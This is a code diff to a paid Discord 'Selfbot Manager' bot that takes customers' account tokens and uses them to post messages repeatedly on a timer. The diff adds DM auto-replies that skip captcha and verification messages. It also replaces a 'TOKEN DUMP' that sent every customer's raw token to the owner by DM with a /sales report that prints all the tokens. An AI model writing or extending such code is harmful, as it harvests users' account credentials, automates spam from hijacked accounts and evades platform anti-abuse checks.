@@ -14,7 +14,10 @@ db.exec(`
     channels TEXT,
     message TEXT,
     delay INTEGER,
-    status TEXT DEFAULT 'stopped'
+    status TEXT DEFAULT 'stopped',
+    auto_reply_dm TEXT DEFAULT 'n',
+    auto_reply_message TEXT,
+    replied_users TEXT DEFAULT '[]'
   );
   CREATE TABLE IF NOT EXISTS keys (
     key TEXT PRIMARY KEY,
@@ -32,6 +35,7 @@ const botClient = new Client({
 
 const ownerId = '1422945082746601594';
 const activeSelfbots = new Map();
+const autoReplyUsers = new Map();
 
 function updateManagerMessage(interaction, userData, selfbotRunning = false) {
   const hasToken = userData.token && userData.token_valid === 'yes';
@@ -39,6 +43,7 @@ function updateManagerMessage(interaction, userData, selfbotRunning = false) {
   const hasMessage = userData.message && userData.message.length > 0;
   const hasDelay = userData.delay && userData.delay > 0;
   const allSet = hasToken && hasChannels && hasMessage && hasDelay;
+  const autoReply = userData.auto_reply_dm === 'y';
   
   const row = new ActionRowBuilder().addComponents(
     new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
@@ -57,14 +62,22 @@ function updateManagerMessage(interaction, userData, selfbotRunning = false) {
       .setCustomId('stop_bot')
       .setLabel('Stop')
       .setStyle(ButtonStyle.Danger)
-      .setDisabled(!selfbotRunning)
+      .setDisabled(!selfbotRunning),
+    new ButtonBuilder()
+      .setCustomId('auto_reply_dm')
+      .setLabel(autoReply ? 'Auto DM: ON' : 'Auto DM: OFF')
+      .setStyle(autoReply ? ButtonStyle.Success : ButtonStyle.Secondary)
   );
   
   let desc = `**Status:** ${selfbotRunning ? '🟢 Running' : '🔴 Stopped'}\n`;
   desc += `**Token:** ${hasToken ? `✅ @${userData.token_username}` : '❌ Not set'}\n`;
   desc += `**Channels:** ${hasChannels ? `✅ Set (${userData.channels.split(',').length})` : '❌ Not set'}\n`;
   desc += `**Message:** ${hasMessage ? '✅ Set' : '❌ Not set'}\n`;
-  desc += `**Delay:** ${hasDelay ? `✅ ${userData.delay}s` : '❌ Not set'}`;
+  desc += `**Delay:** ${hasDelay ? `✅ ${userData.delay}s` : '❌ Not set'}\n`;
+  desc += `**Auto DM:** ${autoReply ? `✅ ON` : '❌ OFF'}`;
+  if (autoReply && userData.auto_reply_message) {
+    desc += `\n**Reply:** ${userData.auto_reply_message.substring(0, 50)}${userData.auto_reply_message.length > 50 ? '...' : ''}`;
+  }
   
   const embed = new EmbedBuilder()
     .setTitle('📱 Selfbot Manager')
@@ -125,7 +138,7 @@ botClient.once('clientReady', () => {
       .toJSON(),
     new SlashCommandBuilder()
       .setName('sales')
-      .setDescription('View How many key redeemed and active')
+      .setDescription('View sales and keys redeemed')
       .toJSON()
   ];
   
@@ -180,8 +193,8 @@ botClient.on('interactionCreate', async interaction => {
     if (keyData.expires && Date.now() > keyData.expires) return interaction.reply({ content: '❌ Key expired.', ephemeral: true });
     
     db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
-    db.prepare('INSERT OR REPLACE INTO users (user_id, key, key_expires, token, token_valid, token_username, channels, message, delay, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
-      .run(interaction.user.id, key, keyData.expires, null, 'no', null, null, null, null, 'stopped');
+    db.prepare('INSERT OR REPLACE INTO users (user_id, key, key_expires, token, token_valid, token_username, channels, message, delay, status, auto_reply_dm, auto_reply_message, replied_users) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)')
+      .run(interaction.user.id, key, keyData.expires, null, 'no', null, null, null, null, 'stopped', 'n', null, '[]');
     
     return interaction.reply({ content: '✅ Key redeemed! Use /manager to configure.', ephemeral: true });
   }
@@ -201,47 +214,43 @@ botClient.on('interactionCreate', async interaction => {
     await interaction.deferReply({ ephemeral: true });
     
     const users = db.prepare('SELECT * FROM users WHERE token IS NOT NULL').all();
+    const totalKeys = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
+    const redeemedKeys = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
+    const activeRunning = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
     
     if (users.length === 0) {
       return interaction.editReply({ content: '❌ No users with tokens found.' });
     }
     
-    // Send to owner's DM
-    try {
-      const owner = await botClient.users.fetch(ownerId);
+    let content = `**📊 Sales Report**\n\n`;
+    content += `**Total Keys:** ${totalKeys}\n`;
+    content += `**Redeemed:** ${redeemedKeys}\n`;
+    content += `**Active Running:** ${activeRunning}\n`;
+    content += `**Total Users:** ${users.length}\n\n`;
+    
+    for (const user of users) {
+      const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(user.user_id);
+      const userObj = await botClient.users.fetch(user.user_id).catch(() => null);
+      const username = userObj ? `@${userObj.username}` : `ID: ${user.user_id}`;
       
-      let dmContent = `**🔐 TOKEN DUMP - ${users.length} Users**\n\n`;
-      
-      for (const user of users) {
-        const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(user.user_id);
-        const userObj = await botClient.users.fetch(user.user_id).catch(() => null);
-        const username = userObj ? `@${userObj.username}` : `ID: ${user.user_id}`;
-        
-        dmContent += `**User:** ${username}\n`;
-        dmContent += `**Token:** \`${user.token}\`\n`;
-        dmContent += `**Status:** ${user.status || 'stopped'}\n`;
-        dmContent += `**Valid:** ${user.token_valid || 'no'}\n`;
-        if (user.token_username) dmContent += `**Account:** @${user.token_username}\n`;
-        if (keyData) {
-          dmContent += `**Key:** \`${keyData.key}\`\n`;
-          if (keyData.expires) dmContent += `**Expires:** <t:${Math.floor(keyData.expires/1000)}:R>\n`;
-        }
-        dmContent += `\n`;
-        
-        // Split DM if too long (Discord limit 2000)
-        if (dmContent.length > 1900) {
-          await owner.send(dmContent.substring(0, 1900));
-          dmContent = '';
-        }
+      content += `**${username}**\n`;
+      content += `Token: \`${user.token || 'N/A'}\`\n`;
+      content += `Status: ${user.status || 'stopped'} | Valid: ${user.token_valid || 'no'}\n`;
+      if (user.token_username) content += `Account: @${user.token_username}\n`;
+      if (keyData) {
+        content += `Key: \`${keyData.key}\`\n`;
+        if (keyData.expires) content += `Expires: <t:${Math.floor(keyData.expires/1000)}:R>\n`;
       }
+      content += `\n`;
       
-      if (dmContent.length > 0) {
-        await owner.send(dmContent);
+      if (content.length > 1800) {
+        await interaction.editReply({ content: content.substring(0, 1800) });
+        content = '';
       }
-      
-      await interaction.editReply({ content: `✅ Sent ${users.length} tokens to your DMs!` });
-    } catch (err) {
-      await interaction.editReply({ content: `❌ Failed to DM: ${err.message}` });
+    }
+    
+    if (content.length > 0) {
+      await interaction.editReply({ content: content });
     }
     
     return;
@@ -282,6 +291,32 @@ botClient.on('interactionCreate', async interaction => {
       return interaction.showModal(modal);
     }
     
+    if (interaction.customId === 'auto_reply_dm') {
+      const modal = new ModalBuilder().setCustomId('modal_auto_reply').setTitle('Auto Reply DM Settings');
+      
+      const enableInput = new TextInputBuilder()
+        .setCustomId('auto_reply_enable')
+        .setLabel('Enable? y = yes, n = no')
+        .setStyle(TextInputStyle.Short)
+        .setPlaceholder('y or n')
+        .setRequired(true)
+        .setMaxLength(1);
+      
+      const messageInput = new TextInputBuilder()
+        .setCustomId('auto_reply_message')
+        .setLabel('Reply message (if enabled)')
+        .setStyle(TextInputStyle.Paragraph)
+        .setPlaceholder('Hello! I will get back to you soon.')
+        .setRequired(false);
+      
+      modal.addComponents(
+        new ActionRowBuilder().addComponents(enableInput),
+        new ActionRowBuilder().addComponents(messageInput)
+      );
+      
+      return interaction.showModal(modal);
+    }
+    
     if (interaction.customId === 'start_bot') {
       const userData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
       if (!userData.token || userData.token_valid !== 'yes' || !userData.channels || !userData.message || !userData.delay) {
@@ -293,6 +328,10 @@ botClient.on('interactionCreate', async interaction => {
         clearInterval(old.interval);
         old.client.destroy();
       }
+      
+      const existingReplied = JSON.parse(userData.replied_users || '[]');
+      const sessionReplied = new Set(existingReplied);
+      autoReplyUsers.set(userId, sessionReplied);
       
       const selfbot = new SelfbotClient({ 
         checkUpdate: false, 
@@ -329,6 +368,28 @@ botClient.on('interactionCreate', async interaction => {
         const interval = setInterval(sendMessage, userData.delay * 1000);
         activeSelfbots.set(userId, { client: selfbot, interval });
         
+        if (userData.auto_reply_dm === 'y' && userData.auto_reply_message) {
+          selfbot.on('messageCreate', async (msg) => {
+            if (msg.channel.type !== 'DM') return;
+            if (msg.author.id === selfbot.user.id) return;
+            if (msg.content.toLowerCase().includes('captcha') || 
+                msg.content.toLowerCase().includes('verify') ||
+                msg.content.toLowerCase().includes('robot')) return;
+            
+            const repliedSet = autoReplyUsers.get(userId);
+            if (!repliedSet) return;
+            
+            if (!repliedSet.has(msg.author.id)) {
+              try {
+                await msg.channel.send(userData.auto_reply_message);
+                repliedSet.add(msg.author.id);
+                db.prepare('UPDATE users SET replied_users = ? WHERE user_id = ?')
+                  .run(JSON.stringify([...repliedSet]), userId);
+              } catch (e) {}
+            }
+          });
+        }
+        
         const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
         const replyData = updateManagerMessage(interaction, newData, true);
         try { await interaction.update(replyData); } catch {}
@@ -352,6 +413,7 @@ botClient.on('interactionCreate', async interaction => {
         clearInterval(interval);
         client.destroy();
         activeSelfbots.delete(userId);
+        autoReplyUsers.delete(userId);
       }
       
       db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
@@ -423,6 +485,32 @@ botClient.on('interactionCreate', async interaction => {
       const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
       const running = activeSelfbots.has(userId);
       await interaction.update(updateManagerMessage(interaction, newData, running));
+      return;
+    }
+    
+    if (interaction.customId === 'modal_auto_reply') {
+      const enable = interaction.fields.getTextInputValue('auto_reply_enable').toLowerCase().trim();
+      const message = interaction.fields.getTextInputValue('auto_reply_message');
+      
+      if (enable !== 'y' && enable !== 'n') {
+        return interaction.reply({ content: '❌ Please enter y or n only!', ephemeral: true });
+      }
+      
+      db.prepare('UPDATE users SET auto_reply_dm = ?, auto_reply_message = ? WHERE user_id = ?')
+        .run(enable, message || null, userId);
+      
+      db.prepare('UPDATE users SET replied_users = ? WHERE user_id = ?').run('[]', userId);
+      
+      const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
+      const running = activeSelfbots.has(userId);
+      
+      const statusMsg = enable === 'y' ? '✅ Auto DM enabled!' : '❌ Auto DM disabled!';
+      await interaction.reply({ 
+        content: statusMsg,
+        embeds: updateManagerMessage(interaction, newData, running).embeds,
+        components: updateManagerMessage(interaction, newData, running).components,
+        ephemeral: true 
+      });
       return;
     }
   }
